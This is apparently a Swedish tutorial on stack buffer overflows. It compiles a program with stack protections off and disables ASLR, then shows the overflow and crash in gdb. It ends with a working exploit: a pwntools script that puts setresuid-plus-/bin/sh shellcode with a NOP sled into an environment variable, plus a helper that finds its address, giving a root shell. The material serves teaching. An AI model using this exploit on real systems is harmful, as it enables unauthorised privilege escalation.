

## Ex 1

Stäng av skydd

För att kompilera:
```sh
$ gcc -m32 -fno-stack-protector -no-pie -fno-pic -z execstack -o ex1 ex1.c
```

Vad flaggorna gör:
    - `-m32` - 32bitars kompilering
    - `-fno-stack-protector` - stäng av stack protection :)
    - `-z execstack` - stäng av no-exec-flaggor
    - `-fno-pie` - stäng av "position-independent executable"
    - `-fno-pic` - stäng av "position-independent code"

För att kunna köra behöver också ASLR stängas av:
```sh
$ sudo su
$ echo 0 > /proc/sys/kernel/randomize_va_space
```

När detta är gjort så kan vi köra programmet, och få samma adress varje gång
programmet körs.

Förhållandet mellan adresserna motsvarar också storleken på våra arrays

## Ex 2

Visa buffer-overruns

```sh
$ gcc -m32 -fno-stack-protector -fno-pie -fno-pic -z execstack -mpreferred-stack-boundary=2 -o ex2 ex2.c
$ ./ex2 $(python -c 'print "A"*51')
```

Vi skriver in mer än 50 tecken i buf2, allting däröver hamnar i buf1 (och vidare på stacken)

`./ex2 $(python -c 'print "A"*103')` - här skriver vi över våran integer också

Vi kollar vad programmet gör:

```
$ gdb ./ex2

# Visa assemblerkoden för main
(gdb) x/50i main
   0x804849e <main>:    lea    0x4(%esp),%ecx
   0x80484a2 <main+4>:  and    $0xfffffff0,%esp
   0x80484a5 <main+7>:  pushl  -0x4(%ecx)
   0x80484a8 <main+10>: push   %ebp
   0x80484a9 <main+11>: mov    %esp,%ebp
   0x80484ab <main+13>: push   %ecx
   0x80484ac <main+14>: sub    $0x4,%esp
   0x80484af <main+17>: mov    %ecx,%eax
   0x80484b1 <main+19>: cmpl   $0x2,(%eax)
   0x80484b4 <main+22>: je     0x80484d3 <main+53>
   0x80484b6 <main+24>: mov    0x4(%eax),%eax
   0x80484b9 <main+27>: mov    (%eax),%eax
   0x80484bb <main+29>: sub    $0x8,%esp
   0x80484be <main+32>: push   %eax
   0x80484bf <main+33>: push   $0x80485ac
   0x80484c4 <main+38>: call   0x8048300 <printf@plt>
   0x80484c9 <main+43>: add    $0x10,%esp
   0x80484cc <main+46>: mov    $0xffffffff,%eax
   0x80484d1 <main+51>: jmp    0x80484ec <main+78>
   0x80484d3 <main+53>: mov    0x4(%eax),%eax
   0x80484d6 <main+56>: add    $0x4,%eax
   0x80484d9 <main+59>: mov    (%eax),%eax
   0x80484db <main+61>: sub    $0xc,%esp
   0x80484de <main+64>: push   %eax
   0x80484df <main+65>: call   0x804843b <copystr>
   0x80484e4 <main+70>: add    $0x10,%esp
   0x80484e7 <main+73>: mov    $0x0,%eax
   0x80484ec <main+78>: mov    -0x4(%ebp),%ecx
   0x80484ef <main+81>: leave
   0x80484f0 <main+82>: lea    -0x4(%ecx),%esp
   0x80484f3 <main+85>: ret

# Visa assemblerkoden för copystr
(gdb) x/50i copystr
   0x804843b <copystr>: push   %ebp
   0x804843c <copystr+1>:       mov    %esp,%ebp
   0x804843e <copystr+3>:       sub    $0x84,%esp
   0x8048444 <copystr+9>:       pushl  0x8(%ebp)
   0x8048447 <copystr+12>:      lea    -0x84(%ebp),%eax
   0x804844d <copystr+18>:      push   %eax
   0x804844e <copystr+19>:      call   0x8048310 <strcpy@plt>
   0x8048453 <copystr+24>:      add    $0x8,%esp
   0x8048456 <copystr+27>:      mov    -0x4(%ebp),%eax
   0x8048459 <copystr+30>:      push   %eax
   0x804845a <copystr+31>:      lea    -0x4(%ebp),%eax
   0x804845d <copystr+34>:      push   %eax
   0x804845e <copystr+35>:      push   $0x8048560
   0x8048463 <copystr+40>:      call   0x8048300 <printf@plt>
   0x8048468 <copystr+45>:      add    $0xc,%esp
   0x804846b <copystr+48>:      lea    -0x44(%ebp),%eax
   0x804846e <copystr+51>:      push   %eax
   0x804846f <copystr+52>:      lea    -0x44(%ebp),%eax
   0x8048472 <copystr+55>:      push   %eax
   0x8048473 <copystr+56>:      push   $0x804856e
   0x8048478 <copystr+61>:      call   0x8048300 <printf@plt>
   0x804847d <copystr+66>:      add    $0xc,%esp
   0x8048480 <copystr+69>:      lea    -0x84(%ebp),%eax
   0x8048486 <copystr+75>:      push   %eax
   0x8048487 <copystr+76>:      lea    -0x84(%ebp),%eax
   0x804848d <copystr+82>:      push   %eax
   0x804848e <copystr+83>:      push   $0x804857d
   0x8048493 <copystr+88>:      call   0x8048300 <printf@plt>
   0x8048498 <copystr+93>:      add    $0xc,%esp
   0x804849b <copystr+96>:      nop
   0x804849c <copystr+97>:      leave
   0x804849d <copystr+98>:      ret


# Kort genomgång av starten av funktionen:
push   %ebp        - Lägg till vår framepointer på stacken
mov    %esp,%ebp   - Kopiera framepointer till stackpointer
sub    $0x84,%esp  - Gör plats på stacken för 0x84 = 132 bytes
132 bytes:
buf2[64]  64 bytes
buf1[64]  64 bytes
int x      4 bytes

Efter detta kommer på stacken:
frameptr   4 bytes  (%ebp som vi la dit)
retptr     4 bytes  (dit funktionen ska returnera)


# Stoppa i funktionen copystr, och kör igång
(gdb) break copystr
(gdb) run "`python -c 'print "A"*(64+64+4+4+4)'`"

# Visa våra register, och var vi är i asm-koden
(gdb) tui enable
(gdb) layout asm
(gdb) layout regs

# stegar framåt
(gdb) nexti
...
till <copystr+15>

# Skriv ut 2 'words' i hex från vår stack
(gdb) x/2xw $esp
0xffffcde4:     0xffffd141      0xf7fd3b48

# Visa vårat argument
(gdb) x/s 0xffffd141
0xffffd141:     'A' <repeats 140 times>

# Sätt breakpoint på 'ret', och gå dit
(gdb) break \*copystr+98
(gdb) c

(gdb) x/2xw $esp
0xffffce5c:     0x41414141      0xffffd100
(gdb) c
Program received signal SIGSEGV, Segmentation fault.                                                                   
Cannot access memory at address 0x41414141 
```

## Ex 3

Hur vi exploaterar föregående exempel:

Vad vi vet:
 - Att våra variabler tar upp 132 bytes
 - Därefter kommer 4 bytes framepointer
 - Därefter kommer returadressen

Vi lägger in våran kod i en miljövariabel, tillsammans med
massa NOP-instruktioner.

Vi tar sedan reda på adressen till denna variabel, och fyller hela vår buffer
upp till 'ret' med denna adress, så att när 'ret' körs, så kommer våran kod i miljövariabeln
att köras istället.

Kod till get-shellcode.py (skapar en shellcode, och lägger i miljövariabeln 'EGG')
```python
# -*- coding: utf-8 -*-
from pwnlib.asm import asm
from pwnlib.shellcraft.i386.linux import sh, setresuid
import os

instructions = sh()
print("Assembler instructions for shellcode:")
print(instructions)


shellcode = asm(setresuid(0, 0, 0)) + asm(instructions)
# Lägg till no-op instruktioner, så att vi får större träffyta
maxlen = 50000
nopsled = '\x90'*(maxlen - len(shellcode))
shellcode = nopsled + shellcode

os.environ['EGG'] = shellcode

print("Shellcode is now in EGG")
print("Now, run ./getenvaddr EGG <progname> to get address")
os.system("/bin/bash")
```

Kod till getenvaddr: (kompileras med `gcc -m32 -o getenvaddr getenvaddr.c`)
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
	char *ptr;

	if(argc < 3) {
		printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
		exit(0);
	}
	ptr = getenv(argv[1]); /* get env var location */
	ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */
	printf("%s will be at %p\n", argv[1], ptr);
}
```


```sh
$ python get-shellcode.py
...

$ ./getenvaddr EGG ./ex2
EGG will be at 0xffff10c1

$ ./ex2 $(python -c "print ('c110ffff'.decode(hex))*(142/4)")
envp: 0xffff0c90
x: 0xffff0bd8
buf1: 0xffff0b98
buf2: 0xffff0b58
# whoami
root
```
